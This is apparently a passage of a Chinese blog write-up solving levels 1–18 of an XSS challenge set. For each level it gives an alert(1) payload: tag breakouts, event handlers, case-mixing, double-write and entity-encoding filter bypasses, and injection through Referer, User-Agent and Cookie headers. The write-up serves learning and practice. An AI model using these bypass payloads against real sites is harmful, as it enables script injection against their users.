+<h5 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h5><p>输入的地方，在h2标签内，先闭合标签再构造。</p>
+<p>payload：<br><code>&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<br>
+
+<h5 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h5><p><code>&lt;input name=&quot;keyword&quot; value=&quot;input code&quot;&gt;</code></p>
+<p>输入点在<code>input标签内部</code>，所以先闭合<code>input</code>标签。</p>
+<p>payload：<br><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<br>
+
+<h5 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h5><p>这一关输入点，同样在<code>input</code>标签的<code>value</code>值内，尝试上一关闭合标签构造，但是没有成功。</p>
+<p>双引号闭合<code>value=&quot; </code>失败，单引号闭合成功。<br>然后利用onclick、onmouseover等事件进行弹窗。<br>注释掉后面的代码。</p>
+<p>payload:<br><code>&#39; onmouseover=alert(1)//</code></p>
+<br>
+
+<h5 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h5><p>与上一关类似，用双引号闭合<code>value=&quot;</code>即可。</p>
+<p>payload:<br><code>&quot; onclick=alert(1)//</code><br><br></p>
+<h5 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h5><p>这一关会将<code>script</code>替换成<code>scr_ipt</code>，<code>on</code>也会被替换成<code>o_n</code>。</p>
+<p>我们可以闭合<code>&lt;input&gt;</code>后利用<code>&lt;a&gt;</code>标签进行弹窗：</p>
+<p>payload:<br><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
+<h5 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h5><p>这一关在上一关的基础上，多过滤了<code>href</code>、<code>src</code>、<code>data</code>。</p>
+<p>经测试，可以利用大小写进行绕过。</p>
+<p>payload：<br><code>&quot;&gt;&lt;a hREf=&quot;javascript:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
+<h5 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h5><p>先用之前的payload进行测试，发现<code>href</code>和<code>script</code>直接消失了，于是尝试双写绕过，成功。</p>
+<p>payload:<br><code>&quot;&gt;&lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;Lethe&lt;/a&gt;//</code><br><br></p>
+<h5 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h5><p>这一关和前面稍有不同，可以添加友情链接，添加过后的内容直接包含在<code>&lt;a href=&quot;input code&quot;&gt;友情链接&lt;/a&gt;</code>里面。</p>
+<p>于是先尝试<code>javascritpt:alert(1)</code>，但是<code>script</code>同样被替换成了<code>scr_ipt</code>。</p>
+<p>因为html标签内可以直接解析html实体编码，于是尝试用实体编码绕过。</p>
+<p>payload:<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</code><br><br></p>
+<h5 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h5><p>和上题类似，但是这里对链接有了一定要求，必须包含<code>http://</code>，却没有要求一定要在开头….不知道有什么意义</p>
+<p>所以直接在构造的语句最后加上<code>http://</code>绕过检测，再注释掉即可。</p>
+<p>payload：<br><code>java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)//http://</code><br><br></p>
+<h5 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h5><p>这题没有输入框，url上给了一个keyword参数，尝试闭合再构造，虽然回显的内容没有过滤，但是却不会弹窗，查看源码，发现还有一个隐藏的form表单，看看能否利用。</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730195539277.png" alt="在这里插入图片描述"></p>
+<p>尝试<code>?t_link=Lethe&amp;t_history=Lethe&amp;t_sort=Lethe</code></p>
+<p>发现<code>t_sort</code>参数可以利用</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730195830826.png" alt="在这里插入图片描述"></p>
+<p>于是进行构造，发现尖括号被过滤了，于是利用事件进行弹窗。</p>
+<p>payload:<br><code>?t_sort=&quot; type=image src=x onerror=alert(1)//</code></p>
+<br>
+
+<h5 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h5><p>和上一关一样有一个隐藏的表单，也是<code>t_sort</code>参数可以利用</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/2019073020054445.png" alt="在这里插入图片描述"></p>
+<p>用上一关的payload进行测试，发现双引号也被过滤了，应该又要换个思路了。</p>
+<p>重新打开页面观察源码，看到一个可疑的地方，那新增的一个参数不是白加的，当你从第10关跳到第11关时，<code>t_ref</code>的value值是页面的Referer的值。</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730201235164.png" alt="在这里插入图片描述"></p>
+<p>于是在跳转的时候抓包修改Referer的值为<code>&quot; type=text onclick=&quot;alert(1)</code>，如下：</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730201950407.png" alt="在这里插入图片描述"></p>
+<p>然后在Target界面Forward，回到闯关页面发现已成功注，点击输入框即可弹窗。</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730202044406.png" alt="在这里插入图片描述"></p>
+<br>
+
+<h5 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h5><p>与上一关类似，不过这里是利用User-Agent:</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730202249699.png" alt="在这里插入图片描述"></p>
+<p>同样抓包修改User-Agent的值进行构造</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730202431311.png" alt="在这里插入图片描述"></p>
+<p>payload:<br><code>&quot; type=text onclick=&quot;alert(1)</code></p>
+<br>
+
+<h5 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h5><p>与前两关相同，只不过这一关是利用Cookie进行注入。</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730202710641.png" alt="在这里插入图片描述"></p>
+<p>抓包修改Cookie为：<code>user=&quot; type=text onclick=&quot;alert(1)</code>即可</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/2019073020292078.png" alt="在这里插入图片描述"></p>
+<br>
+
+<h5 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h5><p>进入14关，没有输入框，url中没有参数，查看源码，发现使用了<code>&lt;iframe&gt;</code>标签引入了<code>http://www.exifviewer.org/</code></p>
+<p>但是我这边一直打不开<code>http://www.exifviewer.org/</code>，根据网上的题解，上传一个含有xss代码的图片触发xss，关于exif xss这一题的解法，可参考:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1206">https://xz.aliyun.com/t/1206</a></p>
+<br>
+
+<h5 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h5><p>页面什么都没有，那么直接看源码</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730204024883.png" alt="在这里插入图片描述"></p>
+<p>第一眼看貌似也没什么，实际上还是因为我对js不是很熟悉…搜索得到，这里使用了AngularJS框架的 <code>ng-include</code> 指令，可参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/angularjs/ng-ng-include.html">https://www.runoob.com/angularjs/ng-ng-include.html</a></p>
+<p>其实就是可以利用 <code>ng-include</code> 指令来包含文件&gt;</p>
+<p>有两默认情况下，包含的文件需要包含在同一个域名下，也就是符合SOP。</p>
+<p>所以网上大多方法是包含了第一关的代码，如下payload：<code>?src=&#39;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
+<p>但是我在做的过程中发现，引用的名字会直接出现在源码上:</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730210141438.png" alt="在这里插入图片描述"></p>
+<p>那么理论上通过闭合也是可以的</p>
+<p>于是尝试payload:<br><code>?src=&quot;&gt;&lt;img src=&quot;x&quot; onerror=alert(1)&gt;</code></p>
+<p>发现真的是可以的..</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/2019073021103933.png" alt="在这里插入图片描述"></p>
+<br>
+
+<h5 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h5><p>输入点包含在<code>&lt;center&gt;</code>标签内，过滤了空格，可以用<code>%0a</code>代替空格进行绕过。</p>
+<p>payload:<br><code>?keyword=&lt;img%0asrc=x%0aonerror=alert(1)&gt;</code><br><br></p>
+<h5 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h5><p>进入之后会看到一个关于flash的什么东西，暂时先不管，做xss先找输入输出点。</p>
+<p>url中有<code>arg01</code>和<code>arg02</code>两个参数，应该是输入点，查看源码发现在<code>&lt;embed&gt;</code>标签的<code>src</code>中会输出这两个参数的值，如下：</p>
+<p><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XSS-challenges-solutions/20190730211932413.png" alt="在这里插入图片描述"></p>
+<p>先试试闭合，发现过滤了尖括号，可以考虑用<code>onerror</code>弹窗。</p>
+<p>payload：<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
+<br>
+
+<h5 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h5><p>这一关和17关好像是一样的…</p>
+<p>payload:<br><code>?arg01=&amp;arg02= onmouseover=alert(1)</code></p>
+<br>
+
+<p> Level 19 20 好像是关于flash xss的，由于了解不多，而且现在网站用flash的也越来越少了，就不做了。</p>
+<br>
+
+<h3 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h3><p>做了这两套题，这只能说是刚刚了解了XSS是什么，还要很多很多知识需要学习，尤其是要加强实战方面的运用，这就只能在以后的学习过程中慢慢积累了。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/07/30/XSS-challenges-solutions/">https://lethe.site/2019/07/30/XSS-challenges-solutions/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/08/06/understanding-of-PHP-deserialization/">谈一谈PHP反序列化</a>
+            
+            
+            <a class="next" rel="next" href="/2019/07/28/MVC-Simple-Message-Board/">MVC架构实现简易留言管理系统</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
